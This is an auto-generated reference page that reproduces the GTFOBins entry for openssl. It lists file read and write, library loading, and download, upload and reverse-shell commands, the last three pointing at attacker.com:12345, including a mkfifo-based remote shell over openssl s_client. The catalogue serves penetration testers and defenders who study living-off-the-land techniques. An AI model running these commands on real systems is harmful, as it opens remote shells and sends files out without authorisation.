---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# openssl

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `openssl` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/openssl` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [openssl](../../tools/linux/openssl.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | openssl |
| name | openssl |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/openssl/ |

## Preserved Source Material

```yaml
_body: ''
_name: openssl
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/openssl
functions:
  download:
  - code: openssl s_client -quiet -connect attacker.com:12345 >/path/to/output-file
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    sender: tls-server
  file-read:
  - code: openssl enc -in /path/to/input-file
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  file-write:
  - code: echo DATA | openssl enc -out /path/to/output-file
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  - code: openssl enc -in /path/to/input-file -out /path/to/output-file
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  library-load:
  - code: openssl req -engine ./lib.so
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  reverse-shell:
  - code: 'mkfifo /path/to/temp-socket

      /bin/sh -i </path/to/temp-socket 2>&1 | openssl s_client -quiet -connect attacker.com:12345 >/path/to/temp-socket'
    comment: The shell process is not spawn by `openssl`.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    listener: tls-server
  upload:
  - code: openssl s_client -quiet -connect attacker.com:12345 </path/to/input-file
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    receiver: tls-server
```
